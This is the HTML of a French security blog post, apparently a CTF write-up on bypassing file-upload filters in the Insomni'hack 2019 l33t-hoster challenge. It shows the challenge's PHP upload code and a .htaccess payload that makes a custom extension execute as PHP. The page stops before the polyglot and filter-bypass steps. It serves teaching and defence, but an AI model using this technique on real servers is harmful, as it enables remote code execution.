@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Htaccess, ou comment contourner les mécanismes de dépôt de fichiers. - Trackflaw | Expert en sécurité informatique</title><meta name="Description" content="Découvrez comment contourner les mécanismes de dépôt de fichiers en exploitant une vulnérabilité de type dépôt de fichier. Je vous guide à travers les techniques sophistiquées utilisées pour déposer un fichier malveillant sur un système cible, en illustrant avec l&#39;exemple du challenge l33t-hoster de l’Insomni’hack Teaser 2019 CTF. Apprenez à créer un fichier polyglotte et à contourner la protection anti-PHP, tout en comprenant les mesures de sécurité nécessaires pour contrer de telles attaques. Un article incontournable pour les passionnés de cybersécurité cherchant à approfondir leurs connaissances en matière de sécurité des téléchargements de fichiers."><meta property="og:title" content="Htaccess, ou comment contourner les mécanismes de dépôt de fichiers." />
+<meta property="og:description" content="Découvrez comment contourner les mécanismes de dépôt de fichiers en exploitant une vulnérabilité de type dépôt de fichier. Je vous guide à travers les techniques sophistiquées utilisées pour déposer un fichier malveillant sur un système cible, en illustrant avec l&#39;exemple du challenge l33t-hoster de l’Insomni’hack Teaser 2019 CTF. Apprenez à créer un fichier polyglotte et à contourner la protection anti-PHP, tout en comprenant les mesures de sécurité nécessaires pour contrer de telles attaques. Un article incontournable pour les passionnés de cybersécurité cherchant à approfondir leurs connaissances en matière de sécurité des téléchargements de fichiers." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" /><meta property="og:image" content="http://localhost:1313/images/bypass-file-upload/htaccess.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-04T16:00:00+01:00" />
+<meta property="article:modified_time" content="2023-10-04T16:00:00+01:00" /><meta property="og:site_name" content="Trackflaw | Expert en sécurité offensive" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/images/bypass-file-upload/htaccess.png" /><meta name="twitter:title" content="Htaccess, ou comment contourner les mécanismes de dépôt de fichiers."/>
+<meta name="twitter:description" content="Découvrez comment contourner les mécanismes de dépôt de fichiers en exploitant une vulnérabilité de type dépôt de fichier. Je vous guide à travers les techniques sophistiquées utilisées pour déposer un fichier malveillant sur un système cible, en illustrant avec l&#39;exemple du challenge l33t-hoster de l’Insomni’hack Teaser 2019 CTF. Apprenez à créer un fichier polyglotte et à contourner la protection anti-PHP, tout en comprenant les mesures de sécurité nécessaires pour contrer de telles attaques. Un article incontournable pour les passionnés de cybersécurité cherchant à approfondir leurs connaissances en matière de sécurité des téléchargements de fichiers."/>
+      <meta name="twitter:site" content="@trackflaw"/>
+<meta name="application-name" content="Trackflaw | Expert en sécurité offensive">
+<meta name="apple-mobile-web-app-title" content="Trackflaw | Expert en sécurité offensive"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" /><link rel="prev" href="http://localhost:1313/rappel-de-r%C3%A9union-vous-veut-du-mal/" /><link rel="next" href="http://localhost:1313/cr%C3%A9er-son-r%C3%A9seau-botnet-cisco-cve-2023-20198/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Htaccess, ou comment contourner les mécanismes de dépôt de fichiers.",
+        "inLanguage": "fr",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/comment-contourner-d%C3%A9p%C3%B4t-fichiers\/"
+        },"image": ["http:\/\/localhost:1313\/images\/logo.png"],"genre": "posts","keywords": "Pentest, Test d\u0027intrusion, CTF","wordcount":  1486 ,
+        "url": "http:\/\/localhost:1313\/comment-contourner-d%C3%A9p%C3%B4t-fichiers\/","datePublished": "2023-10-04T16:00:00+01:00","dateModified": "2023-10-04T16:00:00+01:00","publisher": {
+            "@type": "Organization",
+            "name": "Thibaud Robin - Trackflaw","logo": "http:\/\/localhost:1313\/images\/logo.png"},"author": {
+                "@type": "Person",
+                "name": "Thibaud Robin"
+            },"description": "Découvrez comment contourner les mécanismes de dépôt de fichiers en exploitant une vulnérabilité de type dépôt de fichier. Je vous guide à travers les techniques sophistiquées utilisées pour déposer un fichier malveillant sur un système cible, en illustrant avec l'exemple du challenge l33t-hoster de l’Insomni’hack Teaser 2019 CTF. Apprenez à créer un fichier polyglotte et à contourner la protection anti-PHP, tout en comprenant les mesures de sécurité nécessaires pour contrer de telles attaques. Un article incontournable pour les passionnés de cybersécurité cherchant à approfondir leurs connaissances en matière de sécurité des téléchargements de fichiers."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Trackflaw | Expert en sécurité informatique"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo3.png"
+        data-srcset="/images/logo3.png, /images/logo3.png 1.5x, /images/logo3.png 2x"
+        data-sizes="auto"
+        alt="/images/logo3.png"
+        title="/images/logo3.png" />TRACKFLAW</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Articles"> Articles </a><a class="menu-item" href="/news/" title="Actualités"> Actualités </a><a class="menu-item" href="/about/" title="A propos"> A propos </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Rechercher">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clair">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Changer de thème">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Choisir la langue">
+                    <i class="fa fa-globe" aria-hidden="true"></i>                      
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" selected>Français</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Trackflaw | Expert en sécurité informatique"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo3.png"
+        data-srcset="/images/logo3.png, /images/logo3.png 1.5x, /images/logo3.png 2x"
+        data-sizes="auto"
+        alt="/images/logo3.png"
+        title="/images/logo3.png" />TRACKFLAW</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Rechercher">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clair">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Annuler
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Articles">Articles</a><a class="menu-item" href="/news/" title="Actualités">Actualités</a><a class="menu-item" href="/about/" title="A propos">A propos</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Changer de thème">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Choisir la langue">
+                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" selected>Français</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contenu</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Htaccess, ou comment contourner les mécanismes de dépôt de fichiers.</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author">
+                    <a href="https://www.linkedin.com/in/thibaud-robin/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="thibaud-picture-big" aria-hidden="true"></i>Thibaud Robin</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="04/10/2023">04/10/2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1486 mots&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/bypass-file-upload/htaccess.png"
+        data-srcset="/images/bypass-file-upload/htaccess.png, /images/bypass-file-upload/htaccess.png 1.5x, /images/bypass-file-upload/htaccess.png 2x"
+        data-sizes="auto"
+        alt="/images/bypass-file-upload/htaccess.png"
+        title="Découvrez comment contourner les mécanismes de dépôt de fichiers en exploitant une vulnérabilité de type dépôt de fichier. Je vous guide à travers les techniques sophistiquées utilisées pour déposer un fichier malveillant sur un système cible, en illustrant avec l&#39;exemple du challenge l33t-hoster de l’Insomni’hack Teaser 2019 CTF. Apprenez à créer un fichier polyglotte et à contourner la protection anti-PHP, tout en comprenant les mesures de sécurité nécessaires pour contrer de telles attaques. Un article incontournable pour les passionnés de cybersécurité cherchant à approfondir leurs connaissances en matière de sécurité des téléchargements de fichiers." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contenu</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#exemple-de-code-vulnérable">Exemple de code vulnérable</a></li>
+    <li><a href="#choisir-le-bon-fichier">Choisir le bon fichier</a></li>
+    <li><a href="#créer-un-fichier-polyglotte">Créer un fichier polyglotte</a></li>
+    <li><a href="#contourner-la-protection-anti-php">Contourner la protection anti-php</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="-comment-contourner-les-mécanismes-de-dépôt-de-fichiers-">📂 Comment contourner les mécanismes de dépôt de fichiers ?</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Une vulnérabilité de type dépôt de fichier est une faille de sécurité permettant à un attaquant de déposer un fichier malveillant sur un système cible. Ce fichier malveillant peut ensuite être utilisé pour exécuter un code arbitraire, voler des données ou causer d&rsquo;autres dommages.</p>
+<p>Il existe de multiples façon de contourner les mécanismes de dépôt de fichier. Cet article est inspirée du challenge l33t-hoster de <a href="https://ctftime.org/event/686" target="_blank" rel="noopener noreffer ">l&rsquo;Insomni&rsquo;hack Teaser 2019 CTF</a>.</p>
+<p>Alors suivez le guide !</p>
+<h2 id="exemple-de-code-vulnérable">Exemple de code vulnérable</h2>
+<p>L&rsquo;objectif du challenge était de pouvoir exécuter des commandes sur le serveur distant à l&rsquo;aide de la fonctionnalité de dépôt de fichier. Or, celle-ci semble bien protégée.</p>
+<p>Le code source de la page est donnée ci-dessous.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="p">]))</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;home&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;home&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">random_bytes</span><span class="p">(</span><span class="mi">20</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$userdir</span> <span class="o">=</span> <span class="s2">&#34;images/</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;home&#34;</span><span class="p">]</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$disallowed_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;php&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;php3&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;php4&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;php5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;php7&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pht&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;phtm&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;phtml&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;phar&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;phps&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;upload&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;yuuuge fail&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$tmp_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;image&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;image&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$parts</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">array_pop</span><span class="p">(</span><span class="nv">$parts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">array_shift</span><span class="p">(</span><span class="nv">$parts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$parts</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;lol filename is empty&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$disallowed_ext</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;lol nice try, but im not stupid dude...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$image</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$image</span><span class="p">,</span> <span class="s2">&#34;&lt;?&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;why would you need php in a pic.....&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">exif_imagetype</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;not an image.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$image_size</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$image_size</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1337</span> <span class="o">||</span> <span class="nv">$image_size</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1337</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;lol noob, your pic is not l33t enough&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="nv">$parts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">,</span> <span class="nv">$userdir</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s2">&#34;.&#34;</span> <span class="o">.</span> <span class="nv">$ext</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h3&gt;Your &lt;a href=</span><span class="si">$userdir</span><span class="s2">&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nx">glob</span><span class="p">(</span><span class="nv">$userdir</span> <span class="o">.</span> <span class="s2">&#34;*&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;li&gt;&lt;a href=&#39;</span><span class="si">$file</span><span class="s2">&#39;&gt;</span><span class="si">$file</span><span class="s2">&lt;/a&gt;&lt;/li&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;/ul&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;h1&gt;Upload your pics!&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;form method=&#34;POST&#34; action=&#34;?&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;input type=&#34;file&#34; name=&#34;image&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;input type=&#34;submit&#34; name=upload&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/form&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le rendu de la page est relativement simple :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/bypass-file-upload/2023-10-05-16-29-21.png"
+        data-srcset="/images/bypass-file-upload/2023-10-05-16-29-21.png, /images/bypass-file-upload/2023-10-05-16-29-21.png 1.5x, /images/bypass-file-upload/2023-10-05-16-29-21.png 2x"
+        data-sizes="auto"
+        alt="/images/bypass-file-upload/2023-10-05-16-29-21.png"
+        title="Rendu site web" /></p>
+<p>Pour résumer l&rsquo;analyse des filtres de sécurité :</p>
+<ul>
+<li>L&rsquo;application vérifie <strong>l&rsquo;extension du fichier</strong>. Si le fichier se termine par .php ou quelque chose de similaire, il est refusé.</li>
+<li>L&rsquo;application vérifie <strong>le nom du fichier</strong>. Si le nom du fichier ne peut pas être divisé en deux fois avec le séparateur .php, il est refusé.</li>
+<li>L&rsquo;application vérifie <strong>le contenu</strong>. Si la chaîne <code>&lt;?</code> est présente dans le contenu, le fichier est refusé.</li>
+<li>L&rsquo;application vérifie <strong>l&rsquo;en-tête</strong>. Si le fichier n&rsquo;est pas une image, il est refusé.</li>
+<li>L&rsquo;application vérifie <strong>la taille</strong>. Si la hauteur et la largeur du fichier ne sont pas égales à 1337, le fichier est refusé.</li>
+</ul>
+<p>Comment faire ?</p>
+<h2 id="choisir-le-bon-fichier">Choisir le bon fichier</h2>
+<p>Pour résumer, il n&rsquo;est pas possible de télécharger de fichiers avec l&rsquo;extension <code>php</code>. L&rsquo;objectif est donc d&rsquo;obtenir la possibilité d&rsquo;exécuter du code php dans un autre fichier que <code>.php</code>. Pour cela, il est possible d&rsquo;utiliser un fichier <code>.htaccess</code>.</p>
+<p>Mais qu&rsquo;est-ce qu&rsquo;un fichier <code>.htaccess</code> ?</p>
+<blockquote>
+<p>Un fichier .htaccess est un fichier de configuration qui permet de modifier le comportement d&rsquo;un serveur web Apache. Il est généralement situé dans le répertoire racine d&rsquo;un site web, mais il peut également être placé dans des sous-répertoires.</p>
+</blockquote>
+<p>Plus de détails ici : <a href="https://httpd.apache.org/docs/2.4/en/howto/htaccess.html" target="_blank" rel="noopener noreffer ">https://httpd.apache.org/docs/2.4/en/howto/htaccess.html</a></p>
+<p>Un fichier <code>.htaccess</code> peut avoir la configuration ci-dessous :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">AddType application/x-httpd-php .php16      <span class="c1"># Say all file with extension .php16 will execute php</span>
+</span></span><span class="line"><span class="cl">php_value zend.multibyte <span class="m">1</span>                  <span class="c1"># Active specific encoding</span>
+</span></span><span class="line"><span class="cl">php_value zend.detect_unicode <span class="m">1</span>             <span class="c1"># Detect if the file have unicode content</span>
+</span></span><span class="line"><span class="cl">php_value display_errors <span class="m">1</span>                  <span class="c1"># Display php errors</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
